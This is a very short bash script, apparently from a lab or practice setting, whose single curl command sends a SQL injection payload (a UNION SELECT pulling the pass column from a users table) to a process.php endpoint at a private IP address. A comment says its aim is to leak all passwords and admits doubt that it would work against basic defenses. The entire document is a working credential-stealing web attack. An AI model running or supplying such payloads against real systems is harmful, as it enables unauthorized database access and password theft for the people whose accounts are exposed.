#!/bin/bash


#Leak all password, very surprised if this works against even the most basic defense
curl -sS "10.1.5.2/process.php?user=' union select 1,2,pass from users; --"
